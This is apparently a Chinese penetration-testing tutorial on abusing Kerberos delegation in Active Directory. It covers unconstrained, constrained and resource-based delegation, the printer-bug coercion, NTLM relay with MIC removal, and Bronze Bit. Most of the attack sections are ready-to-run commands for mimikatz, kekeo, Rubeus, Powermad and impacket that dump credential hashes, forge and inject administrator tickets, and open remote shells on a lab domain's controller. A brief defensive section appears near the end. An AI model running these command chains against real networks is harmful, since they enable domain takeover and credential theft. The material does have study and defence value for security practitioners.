## 非约束委派攻击

当用户A访问了配置非约束委派的服务B，B会将A的TGT缓存在lsass内存中，方便下次使用，通过该TGT票据，能够访问到A能够访问的所有服务，所以，当我们查询到域内配置非约束委派的机器账户或服务账户时，如果能够获取该服务的特权，通过诱导域管访问该服务，将域管用户的TGT票据缓存到内存中，通过ptt来接管域控。

+ 寻找配置了非约束委派的账户

  因为配置非约束的委派的账户的UserAccount 配置了TRUSTED_FOR_DELEGATION flag位，TRUSTED_FOR_DELEGATION 对应是 0x80000 ，也就是 524288 。

  对应的规则为

  ```
  (&(objectCategory=computer)(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))
  #服务账户
  (&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))
  #机器账户
  (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))
  ```

  可以在域内机器上使用adfind查找，ldapsearch同样适用于域外

![spnuser](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/tgas/spnuser.png)

域控机器默认设置为非约束委派

### 攻击手法一

**已知被设置非约束性委派属性的服务账号的口令明文，则可以获取域管理权限**

重新查一遍有哪些服务账户

![hackerhakcer](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/tgas/hackerhakcer.png)

假设我们在当前主机上获取到了hacker用户的明文密码，使用kekeo构造hacker服务账户的票据

```shell
tgt::ask /user:hacker /domain:hack.com /password:!qaz@WSX /ticket:hacker.kirbi
```

![hackerkirbi](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/tgas/hackerkirbi.png)

由于hacker用户被配置为非约束委派，通过构造该服务向域控的TGS票据，访问域控的CIFS服务

```
Tgs::s4u /tgt:TGT_hacker@HACK.COM_krbtgt~hack.com@HAKC.COM.kirbi /user:Administrator@hack.com /service:cifs/DC.hack.com
```

![kekeo2](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/tgas/kekeo2.png)

通过mimikatz ptt将该票据导入到内存中，即可访问域控的cifs服务

### 攻击手法二

**已控制非约束性委派服务账号所在的服务器结合打印机漏洞**

强迫运行打印服务（Print Spooler）的主机向目标主机发起 Kerberos 或 NTLM 认证请求。

条件：需要administrator权限

利用Windows打印系统远程协议`（MS-RPRN）`中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用MS-RPRN `RpcRemoteFindFirstPrinterChangeNotification（Ex）`方法强制任何运行了`Spooler`服务的计算机以通过`Kerberos`或`NTLM`对攻击者选择的目标进行身份验证。

`Print Spooler`服务默认是自动运行的

在域控上查看该服务是否启用

![spooler](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/tgas/spooler.png)

```shell
# 使用Rubeus监听来自域控的票据
Rubeus.exe monitor /interval:2 /filteruser:DC$
```

![rubues-listen](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/tgas/rubues-listen.png)

使用SpoolSample执行打印机漏洞，强制回连

```shell
# 强制回连，获得域控机器账户的TGT
SpoolSample.exe DC PC
```

Rubeus监听到日志事件4624，截取到域控的TGT票据

```shell
#直接将该票据注入到内存中
Rubeus.exe ptt /ticket:base64
```

获取到域控的票据之后，通过mimikatz进行导出，方便使用

```
sekurlsa::tickets /export
```

有了域控的票据，我们就能通过dcsync导出域内所有用户的hash,用于生成黄金票据，或是用于横向接管域控

## 约束委派

约束委派攻击利用了s4u的不安全特性,相教于非约束委派最大的特点就是只能访问特定的服务，约束的委派并不需要用户过来访问就可以代表该用户(对于 HOST SPN，则可以实现完全的远程接管。 对于 MSSQLSvc SPN，则可以拿到 DBA 权限。 对于 CIFS SPN 则可以实现完全的远程文件访问。对于 HTTP SPN 则可能实现接管远程网络服务，而对于 LDAP 则可以执行 DCSync;) ，对于 HTTP 或 SQL 服务帐户，即使它们没有提升目标服务器上的管理员权限，也可能使用 Rotten Potato 进一步滥用，提权至 SYSTEM 的权限)

### 查找域内配置了约束委派的账户

+ Adfind

  因为配置约束的委派的机子的UserAccount 配置了TRUSTED_TO_AUTH_FOR_DELEGATION flag位，TRUSTED_TO_AUTH_FOR_DELEGATION 对应是 0x1000000 ，也就是 1677721

  ```
  # AdFind.exe查询约束委派机器账户
  AdFind.exe -b "DC=hack,DC=com" -f "(&(samAccountType=805306369)(msds-allowedtodelegateto=*))" msds-allowedtodelegateto
  
  # AdFind.exe查询约束委派服务账户
  AdFind.exe -b "DC=hack,DC=com" -f "(&(samAccountType=805306368)(msds-allowedtodelegateto=*))" cn distinguishedName msds-allowedtodelegateto
  ```

  ![adfind](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/tgas/adfind.png)

  服务账户hacker能够被委派访问DC的cifs

+ power-view

  ```shell
  # 导入
  import-module PowerView.ps1
  
  # PowerView查询约束委派机器账户
  powershell Get-DomainComputer -TrustedToAuth -domain redteam.lab -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|ft -Wrap -AutoSize
  
  # PowerView查询约束委派服务账户
  powershell Get-DomainUser –TrustedToAuth -domain redteam.lab -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|fl
  ```

### 利用

约束性委派攻击的关键就是**获得可转发的服务票据ST**
获取根据约束性委派的执行过程可知，只要**控制配置约束性委派服务的机器，并获得了它的密码**，那么我们就可以劫持这台主机的kerberos请求过程，最终获得任意用户权限的ticket

#### 攻击手法一

利用服务账户/机器账户的票据

这里以hacker为例，服务账户与机器账户的攻击手法基本相同，区别在于机器账户能从本地直接导出所需的TGT,服务账户需要重新申请

+ 通过kekeo向KDC请求可转发的服务TGT

  ```
  tgt::ask /user:hacker /domain:hack.com /password:!qaz@WSX /ticket:hacker.kirbi
  ```

+ 通过tgs::s4u请求目标服务的TGS票据

  ```
  Tgs::s4u /tgt:TGT_hacker@HACK.COM_krbtgt~hack.com@HAKC.COM.kirbi /user:Administrator@hack.com /service:cifs/DC.hack.com
  ```

  ![hacker](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/tgas/hacker.png)

+ 通过mimikatz导入该票据

  这里会生成两个票据，其中一个是通过s4uproxy通向DC的cifs服务的，使用该票据

  ![attackway1](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/tgas/attackway1.png)

导入该票据后成功访问DC的cifs服务 

#### 攻击手法二

使用机器账户/服务账户的hash值

> 利用条件:
>
> Administrator权限
>
> 目标账户配置了约束性委派

+ 使用mimikatz抓取目标账户的NTLM hash值

  ![hacker-hash](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/tgas/hacker-hash.png)

+ 使用Rubeus申请服务自身可转发的TGT票据

  ```
  Rubeus.exe asktgt /user:hacker /rc4:c2627b0a561748ba79b8eb3c62c6461c /domain:hack.com /dc:DC.hack.com /nowrap
  ```

  ![rubeus-hacker-tgt](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/tgas/rubeus-hacker-tgt.png)

+ 利用该票据通过Rubeus的s4u向DC的cifs服务申请TGS票据，并注入内存

  ```shell
  # 使用Rubeus通过S4U2Self协议代表域管理员Administrator请求针对域控LDAP服务的票据，并注入内存
  Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:cifs/DC.hack.com /dc:DC.hack.com /ptt /ticket:base64-tgt
  ```

  ![rubeus-cifs-tgs](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/tgas/rubeus-cifs-tgs.png)

+ 在低权限主机上访问DC的cifs服务

  ![attackway2](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/tgas/attackway2.png)

能够成功访问DC的目录

#### 一些其他的利用手法

和上面的区别在于使用脚本的不同，毕竟能导出票据和注入的工具甚多，稍微了解一下手法，例如使用impacket脚本进行票据的申请

+ 使用impacket中的getST脚本进行申请

  ```shell
  # mimikatz获取机器账户NTLM Hash值
  mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
  
  # 使用getST申请服务票据
  python3 getST.py -dc-ip 192.168.30.10 -spn CIFS/DC.hack.com -impersonate Administrator hacker -hashes :c2627b0a561748ba79b8eb3c62c6461c
  
  # 使用票据远程访问
  KRB5CCNAME=Administrator.ccache python3 wmiexec.py -k hack.com/administrator@DC.hack.com -no-pass -dc-ip 192.168.30.10
  ```

  ![getStSHEL](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/tgas/getStSHEL.png)

  该方法能直接获取到目标机器的shell,或许会好用

+ 使用kekeo,这里就只贴出来命令了，和rubeus的利用手法几乎一致

  ```shell
  # 请求票据
  kekeo.exe "tgt::ask /user:hacker/domain:hack.com /NTLM:c2627b0a561748ba79b8eb3c62c6461c" "exit"
  
  # 申请administrator权限的票据
  kekeo.exe "tgs::s4u /tgt:tgt-name /user:Administrator@hack.com /service:cifs/DC.hack.com" "exit"
  
  # mimikatz
  mimikatz.exe "kerberos::ptt tgs-name" "exit"
  ```

#### 关于约束委派

整体看下来关键点在于：

+ 找到配置了约束委派的用户
+ 拿下这个用户/机器
+ 约束委派的服务是什么，这决定了之后我们能利用该服务干什么
+ 权限要足够申请导出票据

## 基于资源的约束委派

基于资源的约束委派，不需要传统约束委派的高配置权限(SeEnableDelegation权限),如果我们有服务账户1，只需要具备服务账户2的ldap权限，服务1就能控制服务2，这一步需要配置服务2的MSDS-AllowedToActOnBehalfOfOtherIdentity指向服务1的sid

因此大致流程可以概括出来

+ 有一个服务账户1/机器账户(把域内机器提权到SYSTEM相当于有了一个账户)，如果我们只有普通的域内用户，可以滥用MachineAccountQuota。

+ 获取服务账户2的LDAP权限
+ 配置服务1对服务2的基于资源的约束委派，对服务2添加sid的指向
+ 发起一个服务1到服务2的正常约束委派流程，从而访问服务2

另外一些攻击手法通过创建机器账户进行实现，将在后面讨论

### 寻找可利用的目标

可以利用的目标，具体是寻找什么样的目标，这是个问题。可以根据我们需要执行的的操作来看，

我们需要修改`msDS-AllowedToActOnBehalfOfOtherIdentity`属性，那我们寻找的目标需要有这个权限，

能够创建机器账户，由msDS-MachineAccountQuota`属性决定，这也是查找的一个点

因此，什么用户能够修改`msDS-AllowedToActOnBehalfOfOtherIdentity`属性？

```shell
#假设我们当前位于域内的一台主机，将在该主机上执行操作
将该主机加入域的用户账户：账户中有一个mSDS-CreatorSID属性，用于标记加入域时使用的用户账户SID值，进一步就可以知道一些具有加入域权限的用户账户
Account Operator组成员
该主机的机器账户
```

**核心目标：找到可修改msDS-AllowedToActOnBehalfOfOtherIdentity的用户**

+ 由机器找到可修改委派权限的用户

  已知机器账户，找到使其加入域中的用户账户，这个用户账户就具备修改`msDS-AllowedToActOnBehalfOfOtherIdentity`的权限

  ```
  # 使用adfind.exe查找机器账户的mS-DS-CreatorSID属性
  AdFind.exe -h 192.168.30.10 -b "DC=hack,DC=com" -f "objectClass=computer" mS-DS-CreatorSID
  
  # 使用Powershell反查SID对应的用户
  powerpick $objSID = New-Object System.Security.Principal.SecurityIdentifier SIF-VALUEs;$objUser = $objSID.Translate([System.Security.Principal.NTAccount]);$objUser.Value
  ```

+ 由用户查询其加入域中的机器

  已知用户查找到通过该用户加入域中的机器

  ```
  # 查用户账户SID
  whoami /all
  
  # 使用PowerView查经由该用户加入域内的机器账户(主机)
  # 需要具备GeneriCall或WriteProperty等修改权限
  import-module PowerView.ps1
  Get-DomainObejctAcl -Identity PC | ?{$_.SecurityIdentifier -match "S-1-5-21-754643614-3937478331-2139222398-1116"}
  ```

  ![user](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/tgas/user.png)

  肯伊看到hacker用户对PC由常规的完全控制权(包含写入权限)

  除了GenericALL权限，WriteProperty,WriteDacl,GenericWrite都对具有写入权限

  由于新创建的计算机账户会自动注册HOST/domain这个SPN，因此达到了基于资源的约束委派攻击的要求

### 攻击手法一

由可写权限的域用户入手(通过管理主机加入域的用户拿下主机)

关键在于：该用户能过够修改目标目标主机的属性，通过创建新的机器账户来拿下目标主机

条件:

1. 允许创建机器账户
2. 具有管理主机加入域的用户账户

假设我们当前已经获取到了hacker这个用户，并且控制了域内的win10主机，hacker用户对win7的属性有可写权限

使用各类方法添加一个名为testv的机器账户，密码为!qaz@WSX

[Powermad](https://github.com/Kevin-Robertson/Powermad)

```
import-moduel powermad.ps1
New-MachineAccount -MachineAccount testv -Password $(ConvertTo-SecureString "!qaz@WSX" -AsPlainText -Force)
```

![testvadd](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/tgas/testvadd.png)

成功添加该账户，我们已经完成了三分之一基于资源的约束委派的工作

+ 为目标主机添加资源委派，指向新建机器账户的sid

  ```shell
  #查询该机器账户的sid,使用powerview
  Get-NetComputer testv -Properties objectsid
  objectsid
  ---------
  S-1-5-21-754643614-3937478331-2139222398-1122
  #配置testv到PC的基于资源的约束委派，即修改PC的属性指向testv的sid
  $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-754643614-3937478331-2139222398-1122)";$SDBytes = New-Object byte[] ($SD.BinaryLength);$SD.GetBinaryForm($SDBytes, 0);Get-DomainComputer PC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
  #查询一下是否添加成功
  Get-DomainComputer PC -Properties msds-allowedtoactonbehalfofotheridentity
  ```

  ![sdi-get](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/tgas/sdi-get.png)

+ 申请票据阶段

  **Rubeus**

  ```shell
  # 通过Rubeus申请机器账户CPT01$的TGT
  Rubeus.exe asktgt /user:testv$ /password:!qaz@WSX /domain:hack.com /dc:DC.hack.com /nowrap /outfile:testv.kirbi
  
  # 使用S4U2Self协议申请TGS并且使用S4U2Proxy协议请求cifs服务票据ST，注入内存中
  Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/PC.hack.com /dc:DC.hack.com /nowrap /ptt /ticket:your-ticket
  
  ```

  ![klist (2)](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/tgas/klist%20(2).png)

此时就能访问PC的cifs服务，也能够使用Psexec去起一个PC的shell

**Impacket**

与rubeus同理，直接使用脚本进行请求即可

```shell
# 使用getST.py申请票据
python3 getST.py hack.com/testv$:\!qaz@WSX -spn cifs/PC.hack.com -impersonate administrator -dc-ip 192.168.30.10

# 导入票据
export KRB5CCNAME=administrator.ccache

# 直接登录
python3 wmiexec.py -k PC.hack.com -no-pass -dc-ip 192.168.30.10
python3 psexec.py -k PC.hack.com -no-pass -dc-ip 192.168.30.10
```

### 攻击手法二

**使用Account Operators组成员**

条件

1. 获取到属于Account Operators组的用户账户
2. 可以创建机器账户

能够获取到Account Operators组用户的权限，可以获得域内除域控以外的机器

**Account Operators组成员可以修改**域内任意主机**的`msDS-AllowedToActOnBehalfOfOtherIdentity`属性**

+ 查询该组成员

  ```shell
  adfind.exe -h 192.168.30.10 -s subtree -b CN="Account Operators",CN=Builtin,DC=hack,DC=com member
  ```

  ![jackson](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/tgas/jackson.png)

接下来，拿到该成员，利用方式与攻击手法1无二，只是获取到的机器能够更多

攻击手法二相较于一，我认为区别在于手法一先确定机器，到用户再到机器，手法二从用户到机器

### 攻击手法三

**绕过NTLM MIC校验+打印机漏洞+NTLM Relay+基于资源的约束性委派组合攻击(CVE-2019-1040)**

利用条件：

1. 能创建机器账户
2. 目标开启打印机服务

打印机服务是默认开启的

+ 创建机器账户

  这里创建一个名为test2密码为test.123的机器账户，可以使用bloodyAD.py等方法

+ 监听认证请求

  ```
  python3.8 ntlmrelayx.py -t ldap://192.168.30.10 -smb2support --remove-mic --delegate-access --escalate-user test2\$
  ```

  ![ntlmrelayx](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/tgas/ntlmrelayx.png)

+ 使用打印机漏洞强行回连

  ```
  python3 printerbug.py hack.com/hacker:\!qaz@WSX@192.168.30.20 192.168.30.128
  ```


+ 申请服务票据

  ```shell
  # 制作服务票据
  python3 getST.py hack.com/test2\$:test.123 -spn CIFS/PC.hack.com -impersonate Administrator -dc-ip 192.168.30.10
  ```

+ 使用该票据

  ```shell
  # 注入票据
  export KRB5CCNAME=Administrator.ccache
  
  # 远程访问
  python3 smbexec.py -target-ip 192.168.30.20 -k PC.hack.com -no-pass
  ```

### 委派krbtgt

委派krbtgt类似于一个黄金票据，可以用来作权限维持

创建一个新的机器用户，为krbtgt添加指向sid，指向该机器用户

之后就能通过申请票据，远程连接域控

## 委派攻击防范措施及绕过手段

对域委派安全功能绕过主要是通过Kerberos Bronze Bit攻击（CVE-2020-1704），由于服务可以解密自身的票据并且forwardable值不在PAC中，在使用时，forwardable值不受到检查，进而实现绕过目的

[CVE-2020-17049 Kerberos Bronze Bit](https://www.netspi.com/blog/technical/network-penetration-testing/cve-2020-17049-kerberos-bronze-bit-attack/)

利用手段

在getST中加上`-force-forwardable`参数

**防御措施**

- 对于高权限用户，设置为`敏感用户，不能被委派`
- 若要设置委派，不设置非约束性委派而是设置约束性委派
- 可以将敏感用户添加至`Protected User`组中，该组用户不允许被委派

打上微软补丁程序，编号为`KB4598347`

1. 使用服务密钥(PAC_SERVER_CHECKSUM)签名
2. 使用KDC密钥(PAC_PRIVSVR_CHECKSUM)签名
   在之后的S4U2Proxy阶段，KDC会验证PAC的三个签名，三个签名全都验证通过，KDC才会返回服务票据。否则，KDC将返回KRB_AP_ERR_MODIFIED消息。

## 总结一下

侧重于横向移动的攻击手法，也能用来维持权限，关键在于能不能拿到能够委派的服务或者用户

这种攻击依赖于票据，在ntlm协议被禁用的情况下依然能够使用

## 参考链接

https://forum.butian.net/share/1591

https://daiker.gitbook.io/windows-protocol/kerberos/2

https://shu1l.github.io/2020/08/05/kerberos-yu-wei-pai-gong-ji-xue-xi/
